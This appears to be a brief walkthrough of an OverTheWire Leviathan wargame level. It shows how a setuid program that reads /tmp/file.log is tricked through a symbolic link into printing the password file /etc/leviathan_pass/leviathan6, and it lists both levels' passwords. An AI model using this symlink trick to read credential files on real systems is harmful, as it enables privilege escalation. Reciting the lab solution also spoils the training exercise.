Level #6 find the password for leviathan6 user

- Server: leviathan.labs.overthewire.org
- User: leviathan5
- Password: EKKlTF1Xqs

ssh leviathan5@leviathan.labs.overthewire.org -p 2223

// once in the home dir look at the dir contents
ls -la

// the leviathan5 executable is found
lrtace ./leviathan5

// ltrace is used to see the function calls this executable performs
// there is an fopen error due to /tmp/file.log file not existing
touch /tmp/file.log
ltrace ./leviathan5

// after running the executable again we see /tmp/file.log file is open, read and then unlinked
// since the touched /tmp/file.log is empty it reads nothing and nothing is printed to stdout
// didn't confirm if leviathan5 executable read the file as user leviathan6 but tried anyway to create
// hard and soft links to /etc/leviathan_pass/leviathan6
ln /etc/leviathan_pass/leviathan6 /tmp/file.log > didn't work due to permissions
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

./leviathan5

leviathan6 user password: YZ55XPVk2l 
